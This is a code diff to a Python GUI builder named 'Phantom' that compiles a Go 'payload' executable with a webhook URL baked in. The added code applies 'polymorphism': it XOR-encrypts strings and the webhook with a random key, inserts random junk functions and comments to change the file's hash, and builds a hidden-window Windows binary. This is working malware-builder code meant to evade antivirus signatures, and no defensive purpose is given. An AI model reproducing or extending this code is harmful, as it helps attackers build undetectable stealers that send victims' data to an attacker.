@@ -6,6 +6,9 @@ import sys
 import base64
 import threading
 import re
+import random
+import string
+import shutil
 
 def install_dependencies():
     """Checks and installs required python modules"""
@@ -425,6 +428,66 @@ class Phantom:
                             activebackground=self.colors["panel"], activeforeground=self.colors["accent"],
                             font=("Segoe UI", 9), bd=0, highlightthickness=0)
         cb.pack(anchor=tk.W, pady=2)
+
+    def _generate_junk_code(self):
+        """Generates random Go junk functions to change file signature"""
+        junk = ""
+        for _ in range(random.randint(5, 10)):
+            func_name = "".join(random.choices(string.ascii_letters, k=random.randint(8, 16)))
+            junk += f"\nfunc {func_name}() {{\n"
+            # Random logic that doesn't do much but looks real
+            ops = [
+                f"\ta := {random.randint(1, 1000)}\n\tb := {random.randint(1, 1000)}\n\tif a > b {{ a = a - b }}\n",
+                f"\ts := \"{''.join(random.choices(string.ascii_letters, k=10))}\"\n\tif len(s) > 5 {{ s = s[:5] }}\n",
+                f"\tfor i := 0; i < {random.randint(10, 50)}; i++ {{ junk() }}\n"
+            ]
+            junk += random.choice(ops)
+            junk += "}\n"
+        return junk
+
+    def _obfuscate_go_source(self, source_path, webhook_url):
+        """Applies polymorphism: random XOR key and junk code"""
+        with open(source_path, 'r', encoding='utf-8') as f:
+            content = f.read()
+
+        # 1. Generate random XOR key (0x10 to 0x7F)
+        xor_key = random.randint(0x10, 0x7F)
+        
+        # 2. Update the key in the 'd' function in main.go
+        # Expected line: key := byte(0x50) // PHANTOM KEY
+        content = re.sub(r'key := byte\(0x[0-9a-fA-F]+\)', f'key := byte({hex(xor_key)})', content)
+
+        # 3. Encrypt the webhook URL with the NEW key
+        def xor_encrypt(text, key):
+            res = bytearray()
+            for b in text.encode('utf-8'):
+                res.append(b ^ key)
+            return base64.b64encode(res).decode('utf-8')
+
+        obfuscated_webhook = xor_encrypt(webhook_url, xor_key)
+
+        # 4. Find all O("string") and replace with d("obfuscated")
+        def replace_o(match):
+            original_string = match.group(1)
+            # Unescape backslashes for proper encryption
+            unescaped = original_string.encode().decode('unicode_escape')
+            obfuscated = xor_encrypt(unescaped, xor_key)
+            return f'd("{obfuscated}")'
+
+        content = re.sub(r'O\("((?:\\.|[^"\\])*)"\)', replace_o, content)
+
+        # 5. Add junk code at the end
+        junk = self._generate_junk_code()
+        content += "\n" + junk
+
+        # 5. Add random comments throughout the file to change hash
+        lines = content.split('\n')
+        for _ in range(15):
+            idx = random.randint(0, len(lines)-1)
+            comment = "// " + "".join(random.choices(string.ascii_letters + "0123456789 ", k=40))
+            lines.insert(idx, comment)
+        
+        return "\n".join(lines), obfuscated_webhook
     
     def _find_go_executable(self):
         """Find the Go executable in the system"""
@@ -515,35 +578,52 @@ class Phantom:
             
             script_dir = os.path.dirname(os.path.abspath(__file__))
             go_payload_dir = os.path.join(script_dir, "go_payload")
+            main_go_path = os.path.join(go_payload_dir, "main.go")
+            temp_main_go = os.path.join(go_payload_dir, f"build_{random.randint(1000, 9999)}.go")
             output_exe = os.path.join(self.destination, exe_name)
             
-            if not os.path.exists(os.path.join(go_payload_dir, "main.go")):
+            if not os.path.exists(main_go_path):
                 messagebox.showerror("Error", "Source files missing in 'go_payload' directory")
                 return
             
-            self.status_label.config(text="Preparing build environment...")
+            self.status_label.config(text="Applying polymorphism & obfuscation...")
             self.progress_var.set(20)
+            self.root.update()
+
+            # Apply polymorphism and get obfuscated webhook
+            new_source, final_webhook = self._obfuscate_go_source(main_go_path, url)
+            with open(temp_main_go, 'w', encoding='utf-8') as f:
+                f.write(new_source)
+            
+            self.status_label.config(text="Preparing build environment...")
+            self.progress_var.set(30)
             self.root.update()
             
             # Compile Go code
             timestamp = str(__import__('datetime').datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
             
             # ldflags: -s -w (reduce size), -H=windowsgui (no console window)
-            ldflags = f"-s -w -H=windowsgui -X \"main.WebhookURL={url}\" -X \"main.Timestamp={timestamp}\""
+            ldflags = f"-s -w -H=windowsgui -X \"main.WebhookURL={final_webhook}\" -X \"main.Timestamp={timestamp}\""
             
             self.status_label.config(text="Compiling binary (Go)...")
-            self.progress_var.set(40)
+            self.progress_var.set(50)
             self.root.update()
 
             build_cmd = [
                 self.go_executable, "build",
                 "-o", output_exe,
                 "-ldflags", ldflags,
-                "main.go"
+                os.path.basename(temp_main_go)
             ]
             
             result = subprocess.run(build_cmd, check=True, cwd=go_payload_dir, 
                                  capture_output=True, text=True)
+            
+            # Cleanup temp source
+            try:
+                os.remove(temp_main_go)
+            except:
+                pass
             
             # Inject icon & Metadata
             target_file_for_meta = None
